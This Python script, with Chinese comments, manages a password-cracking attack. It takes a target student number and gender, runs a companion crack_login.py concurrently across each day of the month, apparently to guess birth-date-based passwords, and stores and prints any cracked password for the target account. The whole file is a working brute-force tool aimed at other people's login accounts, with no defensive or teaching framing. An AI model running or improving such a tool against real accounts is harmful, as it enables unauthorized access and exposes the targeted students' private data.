# -*- coding: utf-8 -*-
import argparse
import os
import sqlite3
import subprocess
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

DB_FILE = "crack.db"


def check_success(username):
    """检查数据库中是否已经找到该用户的密码"""
    if not os.path.exists(DB_FILE):
        return False
    try:
        # 使用较短的超时时间进行快速检查
        conn = sqlite3.connect(DB_FILE, timeout=5)
        cursor = conn.cursor()
        cursor.execute(
            "SELECT password FROM found_passwords WHERE username = ?", (username,)
        )
        result = cursor.fetchone()
        conn.close()
        return result[0] if result else None
    except sqlite3.Error:
        return None


def run_day_worker(username, day, gender, show):
    """
    工作线程函数：调用 crack_login.py 处理特定日期
    """
    cmd = [
        "uv",
        "run",
        "crack_login.py",
        username,
        "--day",
        day,
        "--gender",
        gender,
    ]
    if show:
        cmd.append("--show")

    try:
        # 捕获输出以免干扰主进程显示，但在出错时可以打印
        process = subprocess.run(cmd, capture_output=True, text=True)
        return day, process.returncode, process.stdout, process.stderr
    except Exception as e:
        return day, -1, "", str(e)


def main():
    parser = argparse.ArgumentParser(
        description="多进程管理器：并发运行 crack_login.py 以加速破解"
    )
    parser.add_argument("username", help="目标学号")
    parser.add_argument(
        "--gender", "-g", choices=["M", "F"], default="M", help="目标性别 (默认 M)"
    )
    parser.add_argument(
        "--workers",
        "-w",
        type=int,
        default=os.cpu_count(),
        help=f"并发工作进程数 (默认 CPU 核心数: {os.cpu_count()})",
    )
    parser.add_argument(
        "--show",
        action="store_true",
        help="显示浏览器窗口 (建议仅在少量 Worker 时开启)",
    )

    args = parser.parse_args()

    username = args.username
    gender = args.gender
    workers = args.workers

    print(f"\n{'=' * 50}")
    print(f"[*] 启动并发破解管理器")
    print(f"[*] 目标用户: {username}")
    print(f"[*] 目标性别: {'男' if gender == 'M' else '女'}")
    print(f"[*] 并发进程: {workers}")
    print(f"{'=' * 50}\n")

    # 1. 检查是否已经破解成功
    found_pw = check_success(username)
    if found_pw:
        print(f"✅ 数据库中已存在该用户密码: {found_pw}")
        print("无需再次运行。")
        return

    # 2. 准备任务列表 (01-31日)
    days = [f"{d:02d}" for d in range(1, 32)]
    total_tasks = len(days)
    print(f"[*] 准备调度 {total_tasks} 个日期的破解任务...")

    start_time = time.time()

    # 3. 使用线程池并发调用子进程
    # 注意：这里使用线程池来管理 subprocess，因为 subprocess 本身就是独立的进程
    with ThreadPoolExecutor(max_workers=workers) as executor:
        # 提交所有任务
        future_to_day = {
            executor.submit(run_day_worker, username, day, gender, args.show): day
            for day in days
        }

        completed = 0

        try:
            for future in as_completed(future_to_day):
                day = future_to_day[future]
                try:
                    d, rc, out, err = future.result()
                    completed += 1

                    # 进度条显示
                    progress = (completed / total_tasks) * 100
                    status_symbol = "✅" if rc == 0 else "⚠️"

                    # 检查输出中是否有成功标志 (crack_login.py 打印的内容)
                    is_success = "✅ 登录成功" in out

                    # 或者是数据库中是否已有记录 (防止多进程竞争时输出未捕获)
                    found_pw = check_success(username)

                    if is_success or found_pw:
                        print(f"\n\n{'!' * 50}")
                        print(f"🔥 [Day {day}] 破解成功！")
                        if found_pw:
                            print(f"🔑 密码: {found_pw}")
                        elif "密码是:" in out:
                            # 简单的提取尝试，实际可以直接看 csv
                            print(f"🔑 (请查看 found_passwords.csv 或数据库)")
                        print(f"{'!' * 50}\n")

                        # 强制退出所有进程
                        print("[*] 正在停止其他任务...")
                        os._exit(0)

                    # 打印简略日志
                    if rc == 0:
                        print(
                            f"[{progress:5.1f}%] Day {day} 任务完成 (无结果或已遍历完毕)"
                        )
                    else:
                        print(f"[{progress:5.1f}%] Day {day} 进程异常退出 (Code: {rc})")
                        # 如果需要调试，可以取消下面注释
                        # print(f"错误输出:\n{err}")

                except Exception as exc:
                    print(f"[-] Day {day} 发生异常: {exc}")

        except KeyboardInterrupt:
            print("\n\n[!] 用户中断管理器。正在停止所有子进程...")
            os._exit(1)

    elapsed = time.time() - start_time
    print(f"\n[*] 所有日期遍历完成，耗时: {elapsed:.2f}秒")
    print("[*] 未找到密码 (或所有组合已尝试完毕)。")


if __name__ == "__main__":
    main()
